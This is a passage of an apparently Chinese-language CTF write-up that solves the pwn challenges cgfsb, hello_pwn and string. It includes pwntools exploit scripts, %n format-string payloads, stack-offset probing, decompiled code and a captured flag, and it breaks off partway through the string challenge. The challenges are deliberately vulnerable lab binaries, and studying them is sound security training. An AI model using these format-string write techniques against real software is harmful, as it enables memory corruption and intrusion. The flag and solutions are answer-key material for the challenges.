<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh=process(&#x27;./cgfsb&#x27;)</span></span><br><span class="line"></span><br><span class="line">sh=remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="string">&#x27;61044&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pwnme=<span class="number">0x0804A068</span>;</span><br><span class="line"></span><br><span class="line">payload=p32(pwnme)+(<span class="string">&#x27;1234%10$n&#x27;</span>).encode()</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;please tell me your name:\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;leave your message please:\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh.interactive()</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hello 123</span><br><span class="line">your message is:</span><br><span class="line">h\xa0\x041234</span><br><span class="line">you pwned me, here is your flag:</span><br><span class="line"></span><br><span class="line">cyberpeace&#123;99ded663a753efee263e10ce468b73c3&#125;</span><br></pre></td></tr></table></figure>
<h2
id="hello_pwn栈缓冲区溢出修改栈中整数">009hello_pwn(栈缓冲区溢出修改栈中整数)</h2>
<p>ida64打开之后F5观察伪代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">read(<span class="number">0</span>, &amp;unk_601068, <span class="number">0x10</span>uLL);		</span><br><span class="line"><span class="keyword">if</span> ( dword_60106C == <span class="number">1853186401</span> )			<span class="comment">//诚如是,则执行sub_400686(),dword_60106C就是需要通过溢出修改的变量</span></span><br><span class="line">  sub_400686();</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_400686</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  system(<span class="string">&quot;cat flag.txt&quot;</span>);<span class="comment">//调用shell,打印flag.txt的内容到屏幕</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>read</code>系统调用函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">read</span><span class="params">(<span class="type">int</span> fd,<span class="type">char</span> *buf,<span class="type">unsigned</span> nbytes)</span>;</span><br></pre></td></tr></table></figure>
<p><strong>参数含义:</strong></p>
<p>1.<code>int fd:</code>file descriptor 文件描述符</p>
<blockquote>
<p>fd=0为<code>STDIN_FLIENO</code>标准输入的魔数</p>
</blockquote>
<blockquote>
<p>fd=1为<code>STDOUT_FILENO</code>标准输出的魔数</p>
<p>fd=2为<code>STDERR_FILENO</code>标准错误的魔数</p>
</blockquote>
<p>2.<code>char *buf:</code>缓冲区</p>
<p>3.<code>unsigned nbytes:</code>指定输入的字节数,实际上获取到的输入只能小于等于该值</p>
<p>如果从一个小文件里获取大于文件字符数的输入则达不到<code>nbytes</code></p>
<p><strong>返回值:</strong></p>
<p>实际获取到的输入字符数</p>
</blockquote>
<p><code>read(0, &amp;unk_601068, 0x10uLL);</code></p>
<p>从标准输入获取至多16字节的输入到缓冲区<code>unk_601068</code></p>
<p>双击<code>unk_601068</code>观察缓冲区在内存的分布</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.bss:0000000000601068 unk_601068      db    ? ;               ; DATA XREF: main+3B↑o</span><br><span class="line">.bss:0000000000601069                 db    ? ;</span><br><span class="line">.bss:000000000060106A                 db    ? ;</span><br><span class="line">.bss:000000000060106B                 db    ? ;</span><br><span class="line">.bss:000000000060106C dword_60106C    dd ?                    ; DATA XREF: main+4A↑r</span><br></pre></td></tr></table></figure>
<p>发现缓冲区<code>unk_601068</code>和<code>dword_60106C</code>这个需要被溢出修改的变量是在bss段紧挨着存放的,两者都是未初始化的全局变量</p>
<p>那么输入前四个字符就已经写满了缓冲区,<code>dword_60106C</code>是一个双字四字节,可以容纳四个ascii字符,考虑后面四个字符输入什么才能使其值被修改为<code>1853186401</code></p>
<p>写成16进制<code>0x6e756161</code>两两一组一个字节,分组的话恰好分成四组,对应四个ascii码</p>
<p><code>0x6e=n</code></p>
<p><code>0x75=u</code></p>
<p><code>0x61=a</code></p>
<p><code>0x61=a</code></p>
<p>输入的字符串在前面的放在低位,即如果<code>str="nuaa"</code>则<code>str[0]='n',str[1]='u',str[2]='a'</code>而根据小端方法,下标小的字符会放在低地址,即</p>
<p><code>'n'-&gt;0x60106C</code></p>
<p><code>'u'-&gt;0x60106D</code></p>
<p><code>'a'-&gt;0x60106E</code></p>
<p><code>'a'-&gt;0x60106F</code></p>
<p>然后从<code>0x60106C</code>开始连续取四个字节作为一个<code>int</code>,得到的是<code>0x(高位)61 61 75 6e(低位)</code>刚好和我们想要的结果<code>0x6e756161</code>是反着的,因此应该输入aaun而不是nuaa</p>
<h2
id="stringprintf格式化字符串漏洞ret2shellcode">010string(printf格式化字符串漏洞,ret2shellcode)</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/desktop/pwn/string]</span><br><span class="line">└─# checksec string</span><br><span class="line">[*] <span class="string">&#x27;/mnt/c/Users/86135/desktop/pwn/string/string&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<p>64位linux程序,用ida64打开之后直接看F5伪代码</p>
<h3 id="main-1">main</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *v4; <span class="comment">// [rsp+18h] [rbp-78h]//双字指针类型,int*</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  sub_400996();</span><br><span class="line">  v4 = <span class="built_in">malloc</span>(<span class="number">8uLL</span>);</span><br><span class="line">  *v4 = <span class="number">68</span>;</span><br><span class="line">  v4[<span class="number">1</span>] = <span class="number">85</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;we are wizard, we will give you hand, you can not defeat dragon by yourself ...&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;we will tell you two secret ...&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;secret[0] is %x\n&quot;</span>, v4);					<span class="comment">//&amp;v4的16进制表示</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;secret[1] is %x\n&quot;</span>, v4 + <span class="number">1</span>);				<span class="comment">//&amp;v4+1的16进制表示,由于开启栈地址随机化,因此该值每次运行不定</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;do not tell anyone &quot;</span>);</span><br><span class="line">  sub_400D72((__int64)v4);				<span class="comment">//游戏剧情</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;The End.....Really?&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="sub_400d72">sub_400D72</h3>
<p><code>v4</code>作为参数从main传递到sub_400D72</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_400D72</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What should your character&#x27;s name be:&quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(s) &lt;= <span class="number">0xC</span> )			<span class="comment">//要求输入的角色名称要小于等于12个字符</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Creating a new player.&quot;</span>);</span><br><span class="line">    sub_400A7D();					<span class="comment">//故事的开端发展高潮</span></span><br><span class="line">    sub_400BB9();</span><br><span class="line">    sub_400CA6((_DWORD *)a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Hei! What&#x27;s up!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="sub_400a7d">sub_400A7D</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_400A7D</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s1[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; This is a famous but quite unusual inn. The air is fresh and the&quot;</span>);</span><br><span class="line">...</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;So, where you will go?east or up?:&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    _isoc99_scanf(<span class="string">&quot;%s&quot;</span>, s1);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;east&quot;</span>) || !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;east&quot;</span>) )<span class="comment">//蜜汁操作,两个判断都是strcmp(s1,&quot;east&quot;),当s1为east时跳出循环</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">      <span class="comment">//当s1!=east一直循环请求输入</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;hei! I&#x27;m secious!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;So, where you will go?:&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(s1, <span class="string">&quot;east&quot;</span>) )			<span class="comment">//蜜汁操作,出了刚才的循环则s1=east,这里的if条件判断一定不会成立,为什么还要设计这么一条路呢?</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;up&quot;</span>) )</span><br><span class="line">      sub_4009DD();					<span class="comment">//屑函数,死路</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;YOU KNOW WHAT YOU DO?&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="sub_400bb9">sub_400BB9</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_400BB9</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-7Ch] BYREF</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+8h] [rbp-78h] BYREF</span></span><br><span class="line">  <span class="type">char</span> format[<span class="number">104</span>]; <span class="comment">// [rsp+10h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);<span class="comment">//从fs段偏移0x28=40字节读取一个四字</span></span><br><span class="line">  v2 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You travel a short distance east.That&#x27;s odd, anyone disappear suddenly&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;, what happend?! You just travel , and find another hole&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You recall, a big black hole will suckk you into it! Know what should you do?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;go into there(1), or leave(0)?:&quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;A voice heard in your mind&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&#x27;Give me an address&#x27;&quot;</span>);				</span><br><span class="line">    _isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;v2);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;And, you wish is:&quot;</span>);</span><br><span class="line">    _isoc99_scanf(<span class="string">&quot;%s&quot;</span>, format);		</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Your wish is&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(format);				<span class="comment">//此处存在格式化字符串漏洞</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;I hear it, I hear it....&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>存在格式化字符串漏洞,有可能要利用,联系后文可知,此处要使用printf格式化字符串漏洞,将主函数中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*v4 = 68;</span><br><span class="line">v4[1] = 85;</span><br></pre></td></tr></table></figure>
<p>它俩给溢出修改成相同的值</p>
<p>前面主函数中还有</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;secret[0] is %x\n&quot;</span>, v4);					<span class="comment">//&amp;v4的16进制表示</span></span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;secret[1] is %x\n&quot;</span>, v4 + <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<p>将v4和v4[1]的地址直接白给了</p>
<p>考虑如何构造这个格式化字符串漏洞攻击</p>
<p>注意到</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;&#x27;Give me an address&#x27;&quot;</span>);				</span><br><span class="line">_isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;v2);</span><br></pre></td></tr></table></figure>
<p>这里输入了一个长整数v2,也是放在栈上的,我们可以把v4的地址输入v2,然后溢出改变之</p>
<blockquote>
<p>也可以不使用这里的v2,直接在格式化字符串中完成</p>
</blockquote>
<p>首先要找出<code>printf(s)</code>打印时,v2在栈中,是第几个格式化字符串参数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">&#x27;./string&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;What should your character&#x27;s name be:&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">&#x27;Vader&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;So, where you will go?east or up?:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">&#x27;east&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;go into there(1), or leave(0)?:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;&#x27;Give me an address&#x27;&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">&#x27;9999&#x27;</span>)<span class="comment">#这里使用9999,其16进制值为0x270f,待会儿方便寻找</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sh.interactive()</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;And, you wish is:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">&#x27;AAAAAAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p&#x27;</span>)//AAAAAAAA八个字符正好在栈上占一个对齐单元</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>运行结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Your wish is</span><br><span class="line">AAAAAAAA-0x7f6645ea9743-(nil)-0x7f6645dc8603-0xd-0xffffffffffffff88-0x100000000-0x270f-0x4141414141414141-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0x252d70252d70252d-0x70252d70252d70I hear it, I hear it.... </span><br></pre></td></tr></table></figure>
<table>
<colgroup>
<col style="width: 9%" />
<col style="width: 8%" />
<col style="width: 8%" />
<col style="width: 3%" />
<col style="width: 8%" />
<col style="width: 2%" />
<col style="width: 11%" />
<col style="width: 7%" />
<col style="width: 10%" />
<col style="width: 28%" />
</colgroup>
<thead>
<tr>
<th>第n个格式化参数</th>
<th>不是格式化参数</th>
<th>1</th>
<th>2</th>
<th>3</th>
<th>4</th>
<th>5</th>
<th>6</th>
<th>7</th>
<th>8</th>
</tr>
</thead>
<tbody>
<tr>
<td>打印内容</td>
<td>AAAAAAAA</td>
<td>0x7f6645ea9743</td>
<td>(nil)</td>
<td>0x7f6645dc8603</td>
<td>0xd</td>
<td>0xffffffffffffff88</td>
<td>0x100000000</td>
<td>0x270f</td>
<td>0x4141414141414141</td>
</tr>
<tr>
<td>意义</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>9999,刚才输入的v2</td>
<td>格式化字符串本身作为一个普通字符串的起始位置</td>
</tr>
</tbody>
</table>
<p>可以判断,输入的v2将会被作为第7个格式化字符串参数</p>
<p>然后我们在前面的交互过程中获取到v4的地址,在<code>give me an address</code>之后输入,作为第七个格式化字符串参数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">&#x27;./string&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;secret[0] is &#x27;</span>)</span><br><span class="line"></span><br><span class="line">v4_addr = sh.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">v4_addr = <span class="built_in">int</span>(v4_addr, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(v4_addr))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;What should your character&#x27;s name be:&quot;</span>.encode())</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">&#x27;Vader&#x27;</span>.encode())</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;So, where you will go?east or up?:&#x27;</span>.encode())</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">&#x27;east&#x27;</span>.encode())</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;go into there(1), or leave(0)?:&#x27;</span>.encode())</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">&#x27;1&#x27;</span>.encode())</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;&#x27;Give me an address&#x27;&quot;</span>.encode())</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="built_in">str</span>(v4_addr))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;And, you wish is:&#x27;</span>.encode())</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">&#x27;AAAAAAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p&#x27;</span>.encode())</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x1ccb2a0</span></span><br><span class="line">....</span><br><span class="line">Your wish <span class="keyword">is</span></span><br><span class="line">AAAAAAAA-<span class="number">0x7f5c06c84743</span>-(nil)-<span class="number">0x7f5c06ba3603</span>-<span class="number">0xd</span>-<span class="number">0xffffffffffffff88</span>-<span class="number">0x100000000</span>-<span class="number">0x1ccb2a0</span>-<span class="number">0x4141414141414141</span>-<span class="number">0x252d70252d70252d</span>-<span class="number">0x2d70252d70252d70</span>-<span class="number">0x70252d70252d7025</span>-<span class="number">0x252d70252d70252d</span>-0x70252d70252d70I hear it, I hear it....   </span><br></pre></td></tr></table></figure>
<p>现在v4的地址放好了,下面开始构造溢出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*v4 = 68;</span><br><span class="line">v4[1] = 85;</span><br></pre></td></tr></table></figure>
<p>因此我们应当将<code>*v4</code>修改为85,</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;%85c%7$n&#x27;</span></span><br></pre></td></tr></table></figure>
<p>此时执行<code>exp.py</code>得到</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Wizard: I will <span class="built_in">help</span> you! USE YOU SPELL </span><br></pre></td></tr></table></figure>
<p>我们成功召唤了巫师</p>
<h3 id="sub_400ca6_dword-a1">sub_400CA6((_DWORD *)a1)</h3>
<p>a1是<code>sub_400D72</code>的参数,a1的历史沿革:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *v4; <span class="comment">// [rsp+18h] [rbp-78h]//双字指针类型,int*</span></span><br><span class="line">v4 = <span class="built_in">malloc</span>(<span class="number">8uLL</span>);</span><br><span class="line">*v4 = <span class="number">68</span>;			<span class="comment">//v4[0]=68</span></span><br><span class="line">v4[<span class="number">1</span>] = <span class="number">85</span>;		<span class="comment">//v4[1]=85</span></span><br><span class="line"></span><br><span class="line">main-&gt;sub_400D72((__int64)v4)-&gt;sub_400CA6((_DWORD *)a1)</span><br><span class="line">main中v4在堆上开了<span class="number">8</span>字节空间分成两个双字,v4[<span class="number">0</span>]=<span class="number">68</span>,v4[<span class="number">1</span>]=<span class="number">85</span>,然后转化为一个四字qword作为参数进行值传送,然后在sub_400CA6中以双字指针形式进行引用传递</span><br></pre></td></tr></table></figure>
